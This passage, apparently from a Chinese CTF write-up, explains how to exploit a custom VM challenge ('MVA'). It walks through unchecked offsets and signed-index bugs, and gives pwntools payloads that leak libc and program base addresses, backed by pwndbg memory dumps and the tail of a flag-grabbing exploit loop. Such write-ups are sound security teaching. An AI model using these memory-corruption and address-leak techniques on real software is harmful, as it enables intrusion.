class="string">&#x27;[+] flag:&#x27;</span>, res)</span><br><span class="line">       p.interactive()</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">       p.close()</span><br><span class="line">       <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>逻辑简述：</p>
<ul>
<li>程序把输入进来的 “0x100字节的code” 分为 “每4字节一小份”</li>
<li>每份又分为4个部分：key ~ p1 ~ p2 ~ p3 ，key用来定位需要执行的“指令”（which-case中的条目），p1 p2 p3 就是对应的偏移（用于获取v10中的数据）</li>
<li>另外程序中还有 v10（被操作的主体），v12（被打印的主体）</li>
</ul>
<p>漏洞分析：</p>
<ul>
<li>v10被强转为了(_WORD *)类型（2字节），本身为int64（8字节），p1过大很容易时溢出</li>
<li>mul指令没有对p2进行检查，可以把很大的数字（比如地址）写入*(&amp;v10+p1)</li>
<li>mv指令没有对p2进行检查，可以利用较大的数字，使“SBYTEn”被识别为负数</li>
<li>push指令将不断进行“++v9”这个操作，“v12”内部的数据可以溢出</li>
</ul>
<p>先照抄官方的函数定义，并尝试进行泄露：（这里我打算模仿我们组里某个大佬的操作）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pay = push()*<span class="number">8</span></span><br><span class="line">pay +=sh()+push()+sh()+push()+sh()</span><br><span class="line">pay = pay.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+] MVA is starting ...\n&#x27;</span>)</span><br><span class="line">a = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;a: &quot;</span> + <span class="built_in">hex</span>(a))</span><br><span class="line">b = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;b: &quot;</span> + <span class="built_in">hex</span>(b))</span><br><span class="line">c = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;c: &quot;</span> + <span class="built_in">hex</span>(c))</span><br><span class="line">d = (c &lt;&lt; <span class="number">32</span>) | (b &lt;&lt; <span class="number">16</span>) | a</span><br><span class="line">log.success(<span class="string">&quot;d: &quot;</span> + <span class="built_in">hex</span>(d))</span><br><span class="line">libc.address = d - <span class="number">0x223700</span></span><br><span class="line">log.success(<span class="string">&quot;libc.address: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure>
<p>通过“push”使“v9”持续增加，最后打印“v12[v9]”中的数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x55e14e4377fc</span>    mov    rax, qword ptr [rbp - <span class="number">0x230</span>] <span class="comment">/* rax=v9 */</span></span><br><span class="line">  <span class="number">0x55e14e437803</span>    add    rax, <span class="number">1</span> <span class="comment">/* rax=rax+1 */</span></span><br><span class="line">  <span class="number">0x55e14e437807</span>    mov    qword ptr [rbp - <span class="number">0x230</span>], rax <span class="comment">/* v9=rax */</span></span><br><span class="line">► <span class="number">0x55e14e43780e</span>    jmp    <span class="number">0x55e14e437a2b</span> <span class="comment">/* 返回循环开始 */</span>              </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fff54fd5480</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fff54fd5480</span> ◂— <span class="number">0x1</span> <span class="comment">/* v9=1 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fff54fd5488</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7fff54fd5490</span> ◂— <span class="number">0xb1bc9cd4</span> <span class="comment">/* v10 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7fff54fd5498</span> ◂— <span class="number">0x0</span> <span class="comment">/* v11 */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7fff54fd54a0</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[0-3] */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fff54fd5480</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fff54fd5480</span> ◂— <span class="number">0x2</span> <span class="comment">/* v9=2 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fff54fd5488</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7fff54fd5490</span> ◂— <span class="number">0xb1bc9cd4</span> <span class="comment">/* v10 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7fff54fd5498</span> ◂— <span class="number">0x0</span> <span class="comment">/* v11 */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7fff54fd54a0</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[0-3] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7fff54fd54a8</span> ◂— <span class="number">0x1</span> <span class="comment">/* v12[4-7] */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7fff54fd54b0</span> —▸ <span class="number">0x7f518679a700</span> —▸ <span class="number">0x7f518679a190</span> —▸ <span class="number">0x55e14e436000</span> ◂— <span class="number">0x10102464c457f</span> <span class="comment">/* v12[8-11](target) */</span> </span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7fff54fd54b8</span> —▸ <span class="number">0x7f518676a680</span> ◂— <span class="number">0x7f518676a680</span></span><br></pre></td></tr></table></figure>
<ul>
<li>v9 = 8 ：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fff54fd5480</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fff54fd5480</span> ◂— <span class="number">0x8</span> <span class="comment">/* v9=8 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fff54fd5488</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7fff54fd5490</span> ◂— <span class="number">0xb1bc9cd4</span> <span class="comment">/* v10 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7fff54fd5498</span> ◂— <span class="number">0x0</span> <span class="comment">/* v11 */</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7fff54fd54b0</span> —▸ <span class="number">0x7f518679a700</span> —▸ <span class="number">0x7f518679a190</span> —▸ <span class="number">0x55e14e436000</span> ◂— <span class="number">0x10102464c457f</span> <span class="comment">/* v12[8-11](target) */</span> </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x55e14e437a20</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x55e14e43804a</span> ◂— <span class="number">0x205d2b5b000a6425</span> <span class="comment">/* &#x27;%d\n&#x27; */</span></span><br><span class="line">       vararg: <span class="number">0xa700</span> <span class="comment">/* v12[8] */</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>v9 = 9 ：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fff54fd5480</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fff54fd5480</span> ◂— <span class="number">9</span> <span class="comment">/* v9=9 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fff54fd5488</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7fff54fd5490</span> ◂— <span class="number">0xb1bc9cd4</span> <span class="comment">/* v10 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7fff54fd5498</span> ◂— <span class="number">0x0</span> <span class="comment">/* v11 */</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7fff54fd54b0</span> —▸ <span class="number">0x7f5186790000</span> ◂— <span class="string">&#x27;s (%s%%)\n&#x27;</span> <span class="comment">/* v12[8-11](target) */</span> </span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7fff54fd54b8</span> —▸ <span class="number">0x7f518676a680</span> ◂— <span class="number">0x7f518676a680</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x55e14e437a20</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x55e14e43804a</span> ◂— <span class="number">0x205d2b5b000a6425</span> <span class="comment">/* &#x27;%d\n&#x27; */</span></span><br><span class="line">       vararg: <span class="number">0x8679</span> <span class="comment">/* v12[9] */</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>v9 = 10 ：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fff54fd5480</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7fff54fd5480</span> ◂— <span class="number">0xa</span> <span class="comment">/* v9=10 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7fff54fd5488</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7fff54fd5490</span> ◂— <span class="number">0xb1bc9cd4</span> <span class="comment">/* v10 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7fff54fd5498</span> ◂— <span class="number">0x0</span> <span class="comment">/* v11 */</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7fff54fd54b0</span> ◂— <span class="number">0x7f5100000000</span> <span class="comment">/* v12[8-11](target) */</span> </span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7fff54fd54b8</span> —▸ <span class="number">0x7f518676a680</span> ◂— <span class="number">0x7f518676a680</span> </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x55e14e437a20</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x55e14e43804a</span> ◂— <span class="number">0x205d2b5b000a6425</span> <span class="comment">/* &#x27;%d\n&#x27; */</span></span><br><span class="line">       vararg: <span class="number">0x7f51</span> <span class="comment">/* v12[10] */</span> </span><br></pre></td></tr></table></figure>
<p>libc_base 成功泄露，接下来看泄露 pro_base 的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pay = push() <span class="comment"># 没什么用,只是为了调试而已</span></span><br><span class="line">pay += ldr(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xf4</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>)</span><br><span class="line">pay += mv(<span class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)</span><br><span class="line">pay += sh() + push() + sh() + push() + sh()</span><br><span class="line">pay = pay.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+] MVA is starting ...\n&#x27;</span>)</span><br><span class="line">a = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;a: &quot;</span> + <span class="built_in">hex</span>(a))</span><br><span class="line">b = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;b: &quot;</span> + <span class="built_in">hex</span>(b))</span><br><span class="line">c = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;c: &quot;</span> + <span class="built_in">hex</span>(c))</span><br><span class="line">d = (c &lt;&lt; <span class="number">32</span>) | (b &lt;&lt; <span class="number">16</span>) | a</span><br><span class="line">log.success(<span class="string">&quot;d: &quot;</span> + <span class="built_in">hex</span>(d))</span><br><span class="line">elfbase = d - <span class="number">0x1a70</span></span><br><span class="line">log.success(<span class="string">&quot;elfbase: &quot;</span> + <span class="built_in">hex</span>(elfbase))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffcefc61160</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffcefc61160</span> ◂— <span class="number">0x1</span> <span class="comment">/* v9=1 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffcefc61168</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffcefc61170</span> ◂— <span class="number">0x6aa66cd4</span> <span class="comment">/* v10 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffcefc61178</span> ◂— <span class="number">0x0</span> <span class="comment">/* v11 */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffcefc61180</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[start] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffcefc61188</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffcefc61190</span> —▸ <span class="number">0x7f406df3e700</span> —▸ <span class="number">0x7f406df3e190</span> —▸ <span class="number">0x564995599000</span> ◂— <span class="number">0x10102464c457f</span> </span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffcefc61198</span> —▸ <span class="number">0x7f406df0e680</span> ◂— <span class="number">0x7f406df0e680</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>4 个 ldr 执行完毕后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffcefc61160</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffcefc61160</span> ◂— <span class="number">0x1</span> <span class="comment">/* v9=1 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffcefc61168</span> ◂— <span class="number">0x1</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffcefc61170</span> ◂— <span class="number">0xf46aa66cd4</span> <span class="comment">/* v10[0]:f4 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffcefc61178</span> ◂— <span class="number">0x80000000</span> <span class="comment">/* v10[3]:0x80000000 */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffcefc61180</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[start] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffcefc61188</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffcefc61190</span> —▸ <span class="number">0x7f406df3e700</span> —▸ <span class="number">0x7f406df3e190</span> —▸ <span class="number">0x564995599000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffcefc61198</span> —▸ <span class="number">0x7f406df0e680</span> ◂— <span class="number">0x7f406df0e680</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x7ffcefc61170</span> <span class="comment">/* v10被强转为2byte(注意小端序) */</span></span><br><span class="line"><span class="number">0x7ffcefc61170</span>:	<span class="number">0x6aa66cd4</span>	<span class="number">0x000000f4</span>	<span class="number">0x80000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7ffcefc61180</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000001</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>4 个 mv 执行完毕后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffcefc61160</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffcefc61160</span> ◂— <span class="number">0x80000000000000f4</span> <span class="comment">/* v9 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffcefc61168</span> ◂— <span class="number">0x1</span> <span class="comment">/* v10 */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffcefc61170</span> ◂— <span class="number">0xf46aa66cd4</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffcefc61178</span> ◂— <span class="number">0x80000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffcefc61180</span> ◂— <span class="number">0x0</span> <span class="comment">/* v12[start] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffcefc61188</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffcefc61190</span> —▸ <span class="number">0x7f406df3e700</span> —▸ <span class="number">0x7f406df3e190</span> —▸ <span class="number">0x564995599000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffcefc61198</span> —▸ <span class="number">0x7f406df0e680</span> ◂— <span class="number">0x7f406df0e680</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x7ffcefc61160</span> </span><br><span class="line"><span class="number">0x7ffcefc61160</span>:	<span class="number">0x000000f4</span>	<span class="number">0x80000000</span>	<span class="number">0x00000001</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7ffcefc61170</span>:	<span class="number">0x6aa66cd4</span>	<span class="number">0x000000f4</span>	<span class="number">0x80000000</span>	<span class="number">0x00000000</span></span><br><span class="line">    <span class="comment">/* v10[0] to v10[-10] */</span></span><br><span class="line">    <span class="comment">/* v10[3] to v10[-7] */</span></span><br></pre></td></tr></table></figure>
<p>发现v9出现异常，这里解释一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTEn(x, n)   (*((int8*)&amp;(x)+n))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE1(x)   SBYTEn(x,  1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE2(x)   SBYTEn(x,  2)</span></span><br></pre></td></tr></table></figure>
<p>因为“SBYTEn”和“SBYTEn”是“int8”类型，所以“0xf6”被识别为“-9”，“0xf7”被识别为“-8”……</p>
<p>导致“v10[-10]”，“v10[-7]”分别被写入“v10[0]”，“v10[3]”，最终导致“v9”被覆盖</p>
<ul>
<li>v9 = 0x80000000000000f4</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x56499559aa20</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x56499559b04a</span> ◂— <span class="number">0x205d2b5b000a6425</span> <span class="comment">/* &#x27;%d\n&#x27; */</span></span><br><span class="line">       vararg: <span class="number">0xaa70</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: <span class="number">0x80000000000000f4</span>*<span class="number">2</span></span><br><span class="line">Out[<span class="number">5</span>]: <span class="number">18446744073709552104</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: <span class="number">0x7ffcefc61180</span>+<span class="number">18446744073709552104</span></span><br><span class="line">Out[<span class="number">6</span>]: <span class="number">18446884798040773480</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: hex(<span class="number">18446884798040773480</span>) <span class="comment">/* 直接舍弃溢出的部分 */</span></span><br><span class="line">Out[<span class="number">7</span>]: <span class="string">&#x27;0x100007ffcefc61368&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffcefc61368</span> <span class="comment">/* 发现目标数据 */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x7ffcefc61368</span> ◂— <span class="number">0x56499559aa70</span> <span class="comment">/* v12[0x80000000000000f4] */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7ffcefc61370</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7ffcefc61378</span> —▸ <span class="number">0x56499559a100</span> ◂— endbr64 </span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7ffcefc61380</span> —▸ <span class="number">0x7ffcefc61480</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7ffcefc61388</span> ◂— <span class="number">0x39d2b6d7df852f00</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│ rbp <span class="number">0x7ffcefc61390</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>v9 = 0x80000000000000f5</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x56499559aa20</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x56499559b04a</span> ◂— <span class="number">0x205d2b5b000a6425</span> <span class="comment">/* &#x27;%d\n&#x27; */</span></span><br><span class="line">       vararg: <span class="number">0x9559</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffcefc61368</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x7ffcefc61368</span> ◂— <span class="number">0x5649955900f4</span> <span class="comment">/* v12[0x80000000000000f5] */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7ffcefc61370</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7ffcefc61378</span> —▸ <span class="number">0x56499559a100</span> ◂— endbr64 </span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7ffcefc61380</span> —▸ <span class="number">0x7ffcefc61480</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7ffcefc61388</span> ◂— <span class="number">0x39d2b6d7df852f00</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│ rbp <span class="number">0x7ffcefc61390</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>v9 = 0x80000000000000f6</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x56499559aa20</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x56499559b04a</span> ◂— <span class="number">0x205d2b5b000a6425</span> <span class="comment">/* &#x27;%d\n&#x27; */</span></span><br><span class="line">       vararg: <span class="number">0x5649</span></span><br></pre></td></tr></table></figure>
